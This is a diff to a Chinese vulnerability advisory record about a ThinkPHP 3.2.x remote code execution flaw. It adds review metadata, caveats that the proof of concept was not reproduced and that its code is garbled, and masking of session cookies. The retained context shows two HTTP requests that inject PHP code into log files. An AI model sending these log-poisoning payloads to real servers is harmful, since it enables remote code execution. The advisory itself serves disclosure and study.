@@ -1,7 +1,49 @@
 ---
-fofa: "分布情况："
+fofa: ""
 source: "MrWQ/vulnerability-paper"
+product: "ThinkPHP / 3.2 assign变量覆盖"
+record_type: "advisory"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+fofa_unverified: "分布情况："
+title: "漏洞通报 ThinkPHP3-2-x RCE 漏洞通报"
+prerequisites: "来源所述条件，未列明部分仍待核：3.2/3.2.1 filename与3.2.2/3.2.3 _filename不同；需assign首参可控、模板存在及已植入文件/日志"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s/ulRP1slUV4y2Vaghp4So1A"
+id: "vw-496f4aee4f72c837bcadd545"
+entity_id: "ve-496f4aee4f72c837bcadd545"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 测绘字段处置：原 fofa 字段为残缺表达式、错误平台语法或当前解析器不支持的形式，原值完整保留到 fofa_unverified，不把它当作已校验查询或受影响资产证据。正文检索方法保留；具体问题见下列原审阅项。
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：3.2/3.2.1 filename与3.2.2/3.2.3 _filename不同；需assign首参可控、模板存在及已植入文件/日志
+
+代码与实验材料：324行全读，WindowsPHP5.6.27，debug日志差异、上传文件、源码调用链；HTTP/代码丢换行
+
+来源证据范围：默安玄甲署名及微信原文，修复官方具体链接缺
+
+- **结论使用边界（1）**：FOFA字段抽成普通标题；依据：fofa=分布情况，不是查询。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **适用与权限边界（2）**：资产数量不能等同易受攻击；依据：139809是ThinkPHP服务而非满足3.2+assign可控+文件条件的漏洞资产；无统计日期/查询语句。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。
+
+- **代码与转录边界（3）**：代码请求损坏；依据：PHP&lt;?phpnamespace及转义大括号，HTTP/1.1Host同行；参数名词表粘连。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。
+
+- **结论使用边界（4）**：缓冲区结论过度；依据：fetch输出进入缓冲不意味着必须exit/die，取决于调用方是否返回/显示；应限定演示方式。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # 【漏洞通报】ThinkPHP3-2-x RCE 漏洞通报
 
@@ -128,7 +170,7 @@ debug 模式开启或不开启有一点区别，但是都可以。
 请求数据包：
 
 ```
-GET /index.php?m=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;Upgrade-Insecure-Requests: 1
+GET /index.php?m=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=b6r********************f66;Upgrade-Insecure-Requests: 1
 ```
 
 日志文件路径（这里是默认配置的 log 文件路径，ThinkPHP 的日志路径和日期相关）：
@@ -159,7 +201,7 @@ GET /index.php?m=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5
 请求数据包：
 
 ```
-GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66;Upgrade-Insecure-Requests: 1
+GET /index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?> HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=b6r********************f66;Upgrade-Insecure-Requests: 1
 ```
 
 日志文件路径（这里是默认配置的 log 文件路径）：
